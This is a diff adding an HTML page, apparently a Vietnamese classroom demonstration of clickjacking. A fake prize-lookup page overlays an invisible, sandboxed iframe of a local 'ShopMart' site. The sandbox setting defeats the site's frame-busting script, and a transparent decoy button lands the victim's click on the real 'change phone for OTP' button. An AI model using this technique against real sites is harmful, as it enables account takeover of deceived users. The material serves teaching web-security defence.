@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LuckyCheck - Cong Tra Cuu Trung Thuong Su Kien</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Roboto,Arial,sans-serif; }
+  body { background:#fff8ec; color:#222; }
+
+  header.site {
+    height:70px; background:#fff; border-bottom:1px solid #f1dfb8; display:flex;
+    align-items:center; justify-content:space-between; padding:0 30px;
+  }
+  header.site .logo { font-size:21px; font-weight:800; color:#d98c12; }
+
+  .hero {
+    max-width: 760px; margin: 50px auto; text-align:center; background:#fff;
+    border-radius: 20px; padding: 50px 60px; box-shadow: 0 10px 30px rgba(0,0,0,.06);
+    border: 1px solid #f6e6c4;
+  }
+  .hero .trophy { font-size: 54px; }
+  .hero h1 { font-size:24px; margin: 12px 0 8px; }
+  .hero p { color:#8a7a5c; font-size:13.5px; margin-bottom: 30px; }
+  .input-row { display:flex; gap:10px; justify-content:center; margin-bottom: 24px; }
+  .input-row input {
+    border: 1.5px solid #f1dfb8; border-radius:10px; padding: 12px 16px; font-size:14px; width:260px;
+  }
+  #checkBtn {
+    background: linear-gradient(90deg,#f0a93c,#d98c12); color:#fff; border:none;
+    padding: 12px 26px; border-radius:10px; font-weight:700; font-size:13.5px; cursor:pointer;
+  }
+  .note { font-size:11.5px; color:#b3a888; }
+
+  /* ----- IFRAME NAN NHAN, dung sandbox="allow-forms" ----- 
+     QUAN TRONG: KHONG co "allow-scripts" => moi doan JavaScript ben trong
+     trang ShopMart (bao gom ca doan Frame-Busting "if(top!==self)...")
+     se KHONG DUOC THUC THI. Day chinh la ky thuat bypass cua Hung. */
+  #victimFrame {
+    position: fixed; top:0; left:0; width:100vw; height:100vh; border:none;
+    z-index: 30; opacity: 0; pointer-events: none;
+  }
+
+  #decoyBtn {
+    position: fixed; top:450px; left:660px; width:260px; height:50px;
+    z-index: 41; background: transparent; border:none; cursor:pointer;
+  }
+
+  #demoToggle {
+    position: fixed; bottom: 16px; left: 16px; z-index: 99;
+    background:#1b2430; color:#fff; border:1px solid #39495f; border-radius: 10px;
+    padding: 10px 14px; font-size: 12px; cursor:pointer; font-weight:700;
+  }
+  #demoLabel { position: fixed; bottom: 54px; left:16px; z-index:99; background:#000a; color:#fff; padding:4px 10px; border-radius:6px; font-size:11px; }
+</style>
+</head>
+<body>
+
+<header class="site">
+  <div class="logo">🏆 LuckyCheck</div>
+  <div style="font-size:12px;color:#b3a888;">Cong tra cuu trung thuong chinh thuc 2026</div>
+</header>
+
+<div class="hero">
+  <div class="trophy">🏆</div>
+  <h1>Nhap SDT de kiem tra ket qua trung thuong su kien "Quay So May Man 2026"</h1>
+  <p>He thong se doi chieu so dien thoai cua ban voi danh sach nguoi trung thuong duoc cong bo cong khai.</p>
+  <div class="input-row">
+    <input type="text" placeholder="Nhap so dien thoai cua ban..." />
+    <button id="checkBtn" onclick="doCheck()">Kiem Tra Ket Qua Ngay</button>
+  </div>
+  <div class="note">* Ket qua mang tinh chat tham khao, vui long lien he hotline de duoc xac thuc chinh thuc.</div>
+</div>
+
+<!-- IFRAME NAN NHAN - sandbox="allow-forms" => VO HIEU HOA toan bo JS cua trang ben trong,
+     bao gom ca doan frame-busting "if (top !== self) top.location = ..." -->
+<iframe id="victimFrame"
+        src="http://localhost:5000"
+        sandbox="allow-forms">
+</iframe>
+
+<!-- NUT GIA, dat dung toa do nut "Doi SDT nhan OTP" cua ShopMart -->
+<button id="decoyBtn" onclick="doCheck()"></button>
+
+<div id="demoLabel">Opacity iframe: <span id="opVal">0</span></div>
+<button id="demoToggle" onclick="toggleOpacity()">🎚 Chuyen do mo (Giang vien / Tan cong that)</button>
+
+<script>
+  var frame = document.getElementById('victimFrame');
+  var opVal = document.getElementById('opVal');
+  var state = 0;
+
+  function toggleOpacity() {
+    state = state === 0 ? 1 : 0;
+    frame.style.opacity = state === 1 ? '0.35' : '0';
+    opVal.innerText = state === 1 ? '0.35 (che do giai thich)' : '0 (tan cong that - vo hinh)';
+  }
+
+  function doCheck() {
+    alert('🎯 [DEMO] Du trang ShopMart co doan JS frame-busting "if (top!==self)...", nhung vi iframe duoc nhung voi sandbox="allow-forms" (khong co allow-scripts) nen JS nay KHONG CHAY. Click vua roi da roi trung vao nut "Doi SDT nhan OTP" that!');
+  }
+</script>
+</body>
+</html>
